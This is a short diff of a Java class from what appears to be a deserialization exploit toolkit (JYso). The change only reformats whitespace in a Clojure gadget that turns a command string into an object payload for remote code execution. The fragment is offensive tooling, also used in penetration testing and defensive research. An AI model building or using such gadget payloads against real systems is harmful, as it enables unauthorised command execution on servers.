@@ -33,8 +33,8 @@ import static com.qi4l.JYso.gadgets.annotation.Authors.JACKOFMOSTTRADES;
 public class Clojure implements ObjectPayload<Map<?, ?>> {
 
     public Map<?, ?> getObject(String command) throws Exception {
-        String              clojurePayload = ClojureUtil.makeClojurePayload(command);
-        Map<String, Object> fnMap          = new HashMap<>();
+        String clojurePayload = ClojureUtil.makeClojurePayload(command);
+        Map<String, Object> fnMap = new HashMap<>();
         fnMap.put("hashCode", (new core$constantly()).invoke(0));
         AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
         model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
